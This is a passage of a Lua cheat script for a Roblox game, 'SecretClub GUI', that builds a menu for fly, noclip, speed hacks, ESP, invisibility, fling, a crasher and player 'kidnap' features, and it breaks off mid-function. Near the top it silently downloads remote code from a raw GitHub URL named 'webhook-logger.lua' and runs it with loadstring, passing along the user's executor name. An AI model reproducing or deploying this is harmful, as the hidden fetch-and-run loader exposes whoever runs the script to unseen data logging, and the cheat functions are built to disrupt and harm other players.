-- SecretClub GUI 
-- Created by Piscar&Zamorozka
local lines = {
    "",
    " ####  #####  ####  ####  #####  ##### ",
    "#     #     ##     # #  #  #      #    ",
    " #### #####  #     #####  #####  #     ",
    "    # #     ##     # #  #  #      #    ",
    "####  #####  ####  # #  #  #####  #    ",
    "",
    " ####  #     #   # ####  ",
    "#     #     #   # #   # ",
    "#     #     #   # ####  ",
    "#     #     #   # #   # ",
    " ####  ##### #### ####  ",
    ""
}

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Stats = game:GetService("Stats")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Executor Detection
local function getExecutorName()
    if identifyexecutor then
        local s, n = pcall(identifyexecutor)
        if s and n then return n end
    end
    if KRNL_LOADED then return "KRNL" end
    if syn then return "Synapse X" end
    if Fluxus then return "Fluxus" end
    if iselectron then return "Electron" end
    if getexecutorname then
        local s, n = pcall(getexecutorname)
        if s and n then return n end
    end
    return "Unknown"
end

local EXECUTOR_NAME = getExecutorName()

-- Compatibility
if not setclipboard then
    setclipboard = toclipboard or writeclipboard or function(t) print(t) end
end
if not getgenv then getgenv = function() return _G end end


-- ========================================
-- WEBHOOK LOGGER LOADER (FROM GITHUB)
-- ========================================

-- ЗАМЕНИТЕ НА ВАШУ ССЫЛКУ:
local GITHUB_LOGGER_URL = "https://raw.githubusercontent.com/Piscar1/zalupa1/refs/heads/main/webhook-logger.lua"
-- Загрузка и запуск webhook логгера
task.spawn(function()
    local success, result = pcall(function()
        return loadstring(game:HttpGet(GITHUB_LOGGER_URL))()
    end)
    
    if success and result then
        result(EXECUTOR_NAME) -- Запускаем логгер
        print("[SecretClub] ✅ Webhook logger loaded from GitHub")
    else
        warn("[SecretClub] ❌ Failed to load webhook logger: " .. tostring(result))
    end
end)

-- Удаляем старый GUI
if LocalPlayer.PlayerGui:FindFirstChild("SecretClubGUI_Complete") then
    LocalPlayer.PlayerGui:FindFirstChild("SecretClubGUI_Complete"):Destroy()
end

-- Variables
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

-- ========================================
-- ТОЧНО ИЗ ВТОРОГО СКРИПТА: Variables + Settings + PilotStand + UnPilotStand
-- ========================================

local Player = game.Players.LocalPlayer
Player.CharacterAdded:Connect(function()
    task.wait(1)
    Character = Player.Character
end)

local Humanoid = Character:FindFirstChild("Humanoid") or Character:WaitForChild("Humanoid")
local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart") or Character:WaitForChild("HumanoidRootPart")
local StandMorph = Character:FindFirstChild("StandMorph")
local RemoteEvent = Character:FindFirstChild("RemoteEvent") or Character:WaitForChild("RemoteEvent")
local RemoteFunction = Character:FindFirstChild("RemoteFunction") or Character:WaitForChild("RemoteFunction")
local CurrentCamera = workspace.CurrentCamera

local TempStore = Instance.new("Folder", game.ReplicatedStorage)
TempStore.Name = "TempStorage"
local StayInPilot = Instance.new("BoolValue", workspace)
StayInPilot.Value = false

getgenv().settings = {
    ["cachedbodyparts"] = {},
    ["noclip"] = false,
    ["invisenabled"] = nil,
    ["antits"] = nil,
    ["inviskey"] = Enum.KeyCode.L,
    ["oldpos"] = nil,
    ["delay"] = 0.8,
    ["crasher"] = false,
    ["customval"] = 2000,
    ["standspeed"] = 1.5,
    ["pilotjumppower"] = 1.5,
    ["hidebody"] = true,
    ["tpbodytostand"] = true,
    ["bodydistance"] = 37,
    ["pilotkey"] = Enum.KeyCode.H,
    ["currentargs"] = nil,
    ["flingtarget"] = nil,
    ["animationlist"] = {},
    ["1"] = nil,
    ["2"] = nil,
    ["3"] = nil,
    ["4"] = nil,
    ["5"] = nil,
    ["6"] = nil,
    ["7"] = nil,
    ["8"] = nil,
    ["9"] = nil,
    ["target"] = nil,
    ["attach"] = false,
    ["distancefr"] = 2,
    ["god"] = nil,
    ["kidnaptarget"] = nil,
    ["teleportpos"] = CFrame.new(0, -500, 0),
    ["movementpredictionstrength"] = 0.35,
    ["timeout"] = 1,
    ["useinvis"] = true
}

-- Stand Attach Settings (для GUI)
getgenv().AttachSettings = {
    target = nil,
    attach = false,
    distance = 2,
    height = 0,
}

local SummonedStand, StandHumanoid, Camera

local function UpdateIndex()
	CurrentCharacter = Player.Character
	Humanoid = CurrentCharacter:FindFirstChild("Humanoid") or CurrentCharacter:WaitForChild("Humanoid")
	SummonedStand = CurrentCharacter:FindFirstChild("SummonedStand") or CurrentCharacter:WaitForChild("SummonedStand")
	
	StandMorph = CurrentCharacter:FindFirstChild("StandMorph")
	StandHumanoid = StandMorph:FindFirstChild("AnimationController") or StandMorph:WaitForChild("AnimationController")
	
	Camera = workspace.CurrentCamera
end	

local function PilotStand()
	UpdateIndex()
	
	for i,v in workspace.Locations:GetChildren() do
		if v.Name == "Naples' Sewers" then
			v.Parent = TempStore
		end
	end

	local CameraValue = Instance.new("ObjectValue", StandMorph.Parent)
	local PilotFunctions = {["FocusCam"] = CameraValue, ["CFrame"] = CurrentCharacter.PrimaryPart.CFrame}

	CameraValue.Name = "FocusCam"
	CameraValue.Value = StandHumanoid
	
	for _,v in CurrentCharacter:GetChildren() do
		if v:IsA("BasePart") then
			v.CanCollide = false
		end
	end
	
	--//Jumping\\--
	PilotFunctions["JumpSignal"] = Humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
		if Humanoid.Jump then
	    	StandHumanoid.Jump = true
	    end
	end)
	
	--//WalkSpeed\\--
	StandHumanoid.WalkSpeed = Humanoid.WalkSpeed*settings["standspeed"]
	PilotFunctions["PilotSpeed"] = Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
	    StandHumanoid.WalkSpeed = Humanoid.WalkSpeed*settings["standspeed"]
	end)
	
	
	--//Jump Power\\--
	StandHumanoid.JumpPower = Humanoid.JumpPower*settings["pilotjumppower"]
	PilotFunctions["JumpPower"] = Humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
	    StandHumanoid.JumpPower = Humanoid.JumpPower*settings["pilotjumppower"]
	end)
	
	if not settings["hidebody"] then
		CurrentCharacter.PrimaryPart.Anchored = true
	end
	
	--//Walking\\--
	PilotFunctions["LoopTP"] = RunService.Heartbeat:Connect(function()
		local MoveDirection = Camera.CFrame:VectorToObjectSpace(Humanoid.MoveDirection)
		StandHumanoid:Move(MoveDirection, true)
		
		if settings["hidebody"] then
			CurrentCharacter.PrimaryPart.CFrame = StandMorph.PrimaryPart.CFrame+Vector3.new(0,-settings["bodydistance"],0)
		end
	end)
	
	StandMorph:FindFirstChild("AlignOrientation", true).Enabled = false
	StandMorph:FindFirstChild("AlignPosition", true).Enabled = false
	for i,v in StandMorph:GetDescendants() do
	    if v:IsA("BasePart") or v:IsA("UnionOperation") then
	        game:GetService("PhysicsService"):SetPartCollisionGroup(v, "Players")
	    end
	end
	return PilotFunctions
end

local function UnPilotStand(Returned)
	UpdateIndex()
	
	for i,v in game.ReplicatedStorage.TempStorage:GetChildren() do
		if v.Name == "Naples' Sewers" then
			v.Parent = workspace.Locations
		end
	end

	for x,v in Returned do
		if tostring(v) == "Connection" then
			v:Disconnect()
		end
	end
	
	Returned["FocusCam"]:Destroy()
	
	CurrentCharacter.PrimaryPart.Velocity = Vector3.new()
	if settings["tpbodytostand"] then
		CurrentCharacter.PrimaryPart.CFrame = StandMorph.PrimaryPart.CFrame
	else
		CurrentCharacter.PrimaryPart.CFrame = Returned["CFrame"]
	end
	
	StandMorph:FindFirstChild("AlignOrientation", true).Enabled = true
	StandMorph:FindFirstChild("AlignPosition", true).Enabled = true
	for i,v in StandMorph:GetDescendants() do
	    if v:IsA("BasePart") or v:IsA("UnionOperation") then
	        game:GetService("PhysicsService"):SetPartCollisionGroup(v, "Stands")
	    end
	end
	
	if not settings["hidebody"] then
		CurrentCharacter.PrimaryPart.Anchored = false
	end
end

-- EnablePilot / DisablePilot (логика подписок — тоже из второго скрипта)
local function EnablePilot()
    repeat task.wait() until Character:FindFirstChild("StandMorph")
    UpdateIndex()

    settings["1"] = SummonedStand:GetPropertyChangedSignal("Value"):Connect(function()
        if not SummonedStand.Value then
            StayInPilot.Value = false
        end
    end)

    settings["2"] = UserInputService.InputBegan:Connect(function(InputObject)
        if UserInputService:GetFocusedTextBox() then
            return
        end

        if InputObject.KeyCode == settings["pilotkey"] then
            StayInPilot.Value = not StayInPilot.Value
        end
    end)

    settings["3"] = StayInPilot:GetPropertyChangedSignal("Value"):Connect(function()
        if StayInPilot.Value then
            settings["currentargs"] = PilotStand()
        else
            UnPilotStand(settings["currentargs"])
        end
    end)
end

local function DisablePilot()
    if settings["1"] then settings["1"]:Disconnect() end
    if settings["2"] then settings["2"]:Disconnect() end
    if settings["3"] then settings["3"]:Disconnect() end

    if settings["currentargs"] then
        UnPilotStand(settings["currentargs"])
        StayInPilot.Value = false
    end
end

-- ========================================
-- Stand Attach Functions
-- ========================================
local function GetStand()
    if Character and Character:FindFirstChild("StandMorph") then
        return Character.StandMorph
    end
    return nil
end

local function SearchPlayer(Name)
    local ClosestMatch = nil
    local ClosestLetters = 0
    for i,v in workspace.Living:GetChildren() do
        local matched_letters = 0
        for i = 1, #Name do
            if string.sub(Name:lower(), 1, i) == string.sub(v.Name:lower(), 1, i) then
                matched_letters = i
            end
        end
        if matched_letters > ClosestLetters then
            ClosestLetters = matched_letters
            ClosestMatch = v
        end
    end
    return ClosestMatch
end

-- Invisibility Variables
local Highlight = nil
local UndergroundAnimation = nil
local isInvisible = false

-- Animation Variables
local animPlayerActive = {}
local animPlayerConnections = {}

local animations = {
    {name = "Twerk", id = 12874447851, speed = 1.5, timepos = 3.90, looped = true, freezeonend = false},
    {name = "California Girls", id = 124982597491660, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Helicopter", id = 95301257497525, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Helicopter 2", id = 122951149300674, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Helicopter 3", id = 91257498644328, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Da Hood Dance", id = 108171959207138, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Da Hood Stomp", id = 115048845533448, speed = 1.4, timepos = 0, looped = true, freezeonend = false},
    {name = "Flopping Fish", id = 79075971527754, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Gangnam Style", id = 100531289776679, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Caramelldansen", id = 88315693621494, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Air Circle", id = 94324173536622, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Heart Left", id = 110936682778213, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Heart Right", id = 84671941093489, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "67", id = 115439144505157, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "6", id = 115439144505157, speed = 0, timepos = 0.2, looped = false, freezeonend = false},
    {name = "7", id = 115439144505157, speed = 0, timepos = 1.2, looped = false, freezeonend = false},
    {name = "Dog", id = 78195344190486, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "MM2 Zen", id = 86872878957632, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Default Dance", id = 88455578674030, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Sit", id = 97185364700038, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Kazotsky Kick", id = 119264600441310, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Fight Stance", id = 116763940575803, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Oh Who Is You", id = 81389876138766, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Sway Sit", id = 130995344283026, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Sway Sit 2", id = 131836270858895, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "The Worm", id = 90333292347820, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Snake", id = 98476854035224, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Peter Griffin Death", id = 129787664584610, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Walter Scene", id = 113475147402830, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Cute Stomach Lay", id = 80754582835479, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Shadow Dio Pose", id = 92266904563270, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Jotaro Pose", id = 122120443600865, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Jojo Pose", id = 120629563851640, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Float Lay", id = 77840765435893, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Biblically Accurate", id = 109873544976020, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Headless", id = 78837807518622, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "ME!ME!ME!", id = 103235915424832, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Plane", id = 82135680487389, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "XavierSoBased", id = 90802740360125, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Chinese Dance", id = 131758838511368, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Slickback", id = 74288964113793, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Car", id = 108747312576405, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Beat Da Koto Nai", id = 93497729736287, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Tank", id = 94915612757079, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Classic Walk", id = 107806791584829, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Weird Creature", id = 87025086742503, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Skibidi Toilet", id = 127154705636043, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Rolling Crybaby", id = 129699431093711, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Thinking", id = 127088545449493, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Fake Death", id = 88130117312312, speed = 1, timepos = 0, looped = false, freezeonend = true},
    {name = "Laced", id = 135611169366768, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Fit Check", id = 81176957565811, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Surrender", id = 100537772865440, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Assumptions", id = 91294374426630, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Griddy", id = 121966805049108, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Take The L", id = 78653596566468, speed = 1, timepos = 0, looped = true, freezeonend = true},
    {name = "Basketball Head Spin", id = 92854797386719, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Parrot Dance", id = 101810746304426, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Shot", id = 102691551292124, speed = 1, timepos = 0, looped = false, freezeonend = true},
    {name = "Ragdoll", id = 136224735234038, speed = 1, timepos = 0, looped = false, freezeonend = true},
    {name = "Sad Sit", id = 100798804992348, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Soda Pop", id = 105459130960429, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Billy Bounce", id = 137501135905857, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Ballin", id = 119242308765484, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Jackhammer", id = 91423662648449, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Monster Mash", id = 137883764619555, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Fumo Plush", id = 107217181254431, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Rizz Backflip", id = 131205329995035, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Float", id = 89523370947906, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Hi", id = 103041144411206, speed = 1, timepos = 0, looped = false, freezeonend = true},
    {name = "Posessed", id = 90708290447388, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Fuck you!", id = 98289978017308, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Silver Surfer", id = 100663712757148, speed = 0.8, timepos = 0, looped = true, freezeonend = false},
    {name = "Tall Thing Idk", id = 118864464720628, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Cat Sit", id = 99424293618796, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Black Flash", id = 104767795538635, speed = 1, timepos = 0, looped = true, freezeonend = false},
}

local function stopAllAnimations()
    for key, conn in pairs(animPlayerConnections) do
        if conn and typeof(conn) == "RBXScriptConnection" then
            conn:Disconnect()
        end
    end
    animPlayerConnections = {}
    
    for key, track in pairs(animPlayerActive) do
        if track then
            pcall(function() track:Stop() end)
        end
    end
    animPlayerActive = {}
end

-- Ghost Hub Variables
_G.PredictValue = 0.30
_G.AutoClicker = false
_G.IsResetting = false
local vim = game:GetService("VirtualInputManager")
local VirtualUser = game:GetService("VirtualUser")
local gh_selectedPlayer = nil
local gh_isRunning = false
local gh_isFlingActive = false
local gh_isAutoResetEnabled = false
local gh_resetInterval = 5
local gh_currentBV = nil
local autoClickerRunning = false

-- Physics Lab Variables
local seismicActive = false
local vacuumActive = false
local kickActive = false
local spiderMode = false
local airWalk = false
local flying_physics = false
local unshakeable = false
local blackholeActive = false
local airWalkPlate = nil

-- ESP Variables
local espBoxEnabled = false
local espNameEnabled = false
local espDistanceEnabled = false
local espTracerEnabled = false
local espBoxColor = Color3.fromRGB(60, 140, 220)
local espFontSize = 14

local flyEnabled = false
local flySpeed = 50
local flyKeybind = Enum.KeyCode.F
local waitingForFlyKey = false
local bv, bg = nil, nil
local noclipEnabled = false
local speedHackEnabled = false
local walkSpeed = 16
local jumpHackEnabled = false
local jumpPower = 50

-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SecretClubGUI_Complete"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Main Container
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 692, 0, 558)
MainFrame.Position = UDim2.new(0.5, -346, 0.5, -279)
MainFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.ClipsDescendants = false
MainFrame.Parent = ScreenGui

-- Custom Dragging
local dragging = false
local dragInput, dragStart, startPos

local function updateDrag(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(
        startPos.X.Scale, startPos.X.Offset + delta.X,
        startPos.Y.Scale, startPos.Y.Offset + delta.Y
    )
end

-- Top Bar
local TopBar = Instance.new("Frame")
TopBar.Name = "TopBar"
TopBar.Size = UDim2.new(1, 0, 0, 60)
TopBar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame
TopBar.Active = true

TopBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        local mousePos = UserInputService:GetMouseLocation()
        local clickedOnButton = false
        
        for _, child in pairs(TopBar:GetChildren()) do
            if child:IsA("TextButton") or child:IsA("TextLabel") then
                local childPos = child.AbsolutePosition
                local childSize = child.AbsoluteSize
                if mousePos.X >= childPos.X and mousePos.X <= childPos.X + childSize.X and
                   mousePos.Y >= childPos.Y and mousePos.Y <= childPos.Y + childSize.Y then
                    clickedOnButton = true
                    break
                end
            end
        end
        
        if not clickedOnButton then
            dragging = true
            dragStart = input.Position
            startPos = MainFrame.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end
end)

TopBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateDrag(input)
    end
end)

-- SECRETCLUB Logo
local Logo = Instance.new("TextLabel")
Logo.Size = UDim2.new(0, 150, 1, 0)
Logo.Position = UDim2.new(0, 24, 0, 0)
Logo.BackgroundTransparency = 1
Logo.Text = "SECRETCLUB"
Logo.Font = Enum.Font.GothamBold
Logo.TextSize = 18
Logo.TextColor3 = Color3.fromRGB(255, 255, 255)
Logo.TextXAlignment = Enum.TextXAlignment.Left
Logo.Parent = TopBar

-- Save Button
local SaveButton = Instance.new("TextButton")
SaveButton.Size = UDim2.new(0, 70, 0, 28)
SaveButton.Position = UDim2.new(0, 190, 0, 16)
SaveButton.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
SaveButton.Text = "💾  Save"
SaveButton.Font = Enum.Font.Gotham
SaveButton.TextSize = 12
SaveButton.TextColor3 = Color3.fromRGB(160, 160, 160)
SaveButton.BorderSizePixel = 0
SaveButton.Parent = TopBar

local SaveCorner = Instance.new("UICorner")
SaveCorner.CornerRadius = UDim.new(0, 20)
SaveCorner.Parent = SaveButton

SaveButton.MouseEnter:Connect(function()
    TweenService:Create(SaveButton, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(42, 42, 42)}):Play()
end)
SaveButton.MouseLeave:Connect(function()
    TweenService:Create(SaveButton, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(32, 32, 32)}):Play()
end)

-- Config Dropdown
local ConfigDropdown = Instance.new("TextButton")
ConfigDropdown.Size = UDim2.new(0, 120, 0, 28)
ConfigDropdown.Position = UDim2.new(0, 270, 0, 16)
ConfigDropdown.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
ConfigDropdown.Text = "Global                 ▼"
ConfigDropdown.Font = Enum.Font.Gotham
ConfigDropdown.TextSize = 12
ConfigDropdown.TextColor3 = Color3.fromRGB(160, 160, 160)
ConfigDropdown.BorderSizePixel = 0
ConfigDropdown.Parent = TopBar

local ConfigCorner = Instance.new("UICorner")
ConfigCorner.CornerRadius = UDim.new(0, 20)
ConfigCorner.Parent = ConfigDropdown

-- Settings Icon
local SettingsBtn = Instance.new("TextButton")
SettingsBtn.Size = UDim2.new(0, 32, 0, 28)
SettingsBtn.Position = UDim2.new(1, -42, 0, 16)
SettingsBtn.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
SettingsBtn.Text = "⚙"
SettingsBtn.Font = Enum.Font.GothamBold
SettingsBtn.TextSize = 16
SettingsBtn.TextColor3 = Color3.fromRGB(160, 160, 160)
SettingsBtn.BorderSizePixel = 0
SettingsBtn.Parent = TopBar

local SettingsCorner = Instance.new("UICorner")
SettingsCorner.CornerRadius = UDim.new(0, 20)
SettingsCorner.Parent = SettingsBtn

-- Left Sidebar
local Sidebar = Instance.new("ScrollingFrame")
Sidebar.Name = "Sidebar"
Sidebar.Size = UDim2.new(0, 175, 1, -60)
Sidebar.Position = UDim2.new(0, 0, 0, 60)
Sidebar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
Sidebar.BorderSizePixel = 0
Sidebar.ScrollBarThickness = 4
Sidebar.ScrollBarImageColor3 = Color3.fromRGB(60, 140, 220)
Sidebar.CanvasSize = UDim2.new(0, 0, 0, 550)
Sidebar.Parent = MainFrame

local allButtons = {}
local currentActiveButton = nil

local function createSidebarLabel(text, yPos)
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -24, 0, 18)
    Label.Position = UDim2.new(0, 24, 0, yPos)
    Label.BackgroundTransparency = 1
    Label.Text = text
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 10
    Label.TextColor3 = Color3.fromRGB(100, 100, 100)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Sidebar
    return Label
end

local function createSidebarButton(iconText, text, yPos, isActive, iconColor, tabPage)
    local Button = Instance.new("TextButton")
    Button.Name = text
    Button.Size = UDim2.new(1, -20, 0, 34)
    Button.Position = UDim2.new(0, 10, 0, yPos)
    Button.BackgroundColor3 = isActive and Color3.fromRGB(35, 35, 38) or Color3.fromRGB(18, 18, 18)
    Button.Text = ""
    Button.BorderSizePixel = 0
    Button.Parent = Sidebar
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 20)
    Corner.Parent = Button
    
    local Icon = Instance.new("TextLabel")
    Icon.Name = "Icon"
    Icon.Size = UDim2.new(0, 20, 1, 0)
    Icon.Position = UDim2.new(0, 10, 0, 0)
    Icon.BackgroundTransparency = 1
    Icon.Text = iconText
    Icon.Font = Enum.Font.GothamBold
    Icon.TextSize = 14
    Icon.TextColor3 = iconColor or Color3.fromRGB(60, 140, 220)
    Icon.TextXAlignment = Enum.TextXAlignment.Left
    Icon.Parent = Button
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -40, 1, 0)
    Label.Position = UDim2.new(0, 36, 0, 0)
    Label.BackgroundTransparency = 1
    Label.Text = text
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 13
    Label.TextColor3 = Color3.fromRGB(200, 200, 200)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Button
    
    table.insert(allButtons, {Button = Button, Page = tabPage})
    
    Button.MouseButton1Click:Connect(function()
        if currentActiveButton then
            TweenService:Create(currentActiveButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(18, 18, 18)}):Play()
        end
        for _, data in pairs(allButtons) do
            if data.Page then data.Page.Visible = false end
        end
        if tabPage then tabPage.Visible = true end
        currentActiveButton = Button
        TweenService:Create(Button, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(35, 35, 38)}):Play()
    end)
    
    Button.MouseEnter:Connect(function()
        if Button ~= currentActiveButton then
            TweenService:Create(Button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(28, 28, 28)}):Play()
        end
    end)
    Button.MouseLeave:Connect(function()
        if Button ~= currentActiveButton then
            TweenService:Create(Button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(18, 18, 18)}):Play()
        end
    end)
    
    return Button
end

-- Content Area
local ContentArea = Instance.new("Frame")
ContentArea.Name = "ContentArea"
ContentArea.Size = UDim2.new(1, -175, 1, -60)
ContentArea.Position = UDim2.new(0, 175, 0, 60)
ContentArea.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
ContentArea.BorderSizePixel = 0
ContentArea.Parent = MainFrame

local function createPage()
    local ScrollFrame = Instance.new("ScrollingFrame")
    ScrollFrame.Size = UDim2.new(1, -24, 1, -24)
    ScrollFrame.Position = UDim2.new(0, 12, 0, 12)
    ScrollFrame.BackgroundTransparency = 1
    ScrollFrame.BorderSizePixel = 0
    ScrollFrame.ScrollBarThickness = 0
    ScrollFrame.ScrollingEnabled = true
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 600)
    ScrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
    ScrollFrame.Visible = false
    ScrollFrame.Parent = ContentArea
    
    local LeftColumn = Instance.new("Frame")
    LeftColumn.Name = "LeftColumn"
    LeftColumn.Size = UDim2.new(0.48, 0, 1, 0)
    LeftColumn.Position = UDim2.new(0, 0, 0, 0)
    LeftColumn.BackgroundTransparency = 1
    LeftColumn.Parent = ScrollFrame
    
    local LeftLayout = Instance.new("UIListLayout")
    LeftLayout.SortOrder = Enum.SortOrder.LayoutOrder
    LeftLayout.Padding = UDim.new(0, 6)
    LeftLayout.Parent = LeftColumn
    
    local RightColumn = Instance.new("Frame")
    RightColumn.Name = "RightColumn"
    RightColumn.Size = UDim2.new(0.48, 0, 1, 0)
    RightColumn.Position = UDim2.new(0.52, 0, 0, 0)
    RightColumn.BackgroundTransparency = 1
    RightColumn.Parent = ScrollFrame
    
    local RightLayout = Instance.new("UIListLayout")
    RightLayout.SortOrder = Enum.SortOrder.LayoutOrder
    RightLayout.Padding = UDim.new(0, 6)
    RightLayout.Parent = RightColumn
    
    return ScrollFrame, LeftColumn, RightColumn
end

-- Helper Functions
local function createSectionHeader(text)
    local Header = Instance.new("TextLabel")
    Header.Size = UDim2.new(1, 0, 0, 28)
    Header.BackgroundTransparency = 1
    Header.Text = text
    Header.Font = Enum.Font.GothamBold
    Header.TextSize = 13
    Header.TextColor3 = Color3.fromRGB(240, 240, 240)
    Header.TextXAlignment = Enum.TextXAlignment.Left
    return Header
end

local function createToggle(parent, labelText, defaultValue, callback)
    local Toggle = Instance.new("Frame")
    Toggle.Size = UDim2.new(1, 0, 0, 24)
    Toggle.BackgroundTransparency = 1
    Toggle.Parent = parent
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -25, 1, 0)
    Label.BackgroundTransparency = 1
    Label.Text = labelText
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 12
    Label.TextColor3 = Color3.fromRGB(180, 180, 180)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Toggle
    
    local Switch = Instance.new("TextButton")
    Switch.Name = "ToggleSwitch"
    Switch.Size = UDim2.new(0, 16, 0, 16)
    Switch.Position = UDim2.new(1, -16, 0.5, -8)
    Switch.BackgroundColor3 = defaultValue and Color3.fromRGB(60, 140, 220) or Color3.fromRGB(50, 50, 50)
    Switch.Text = ""
    Switch.BorderSizePixel = 0
    Switch.Parent = Toggle
    
    local SwitchCorner = Instance.new("UICorner")
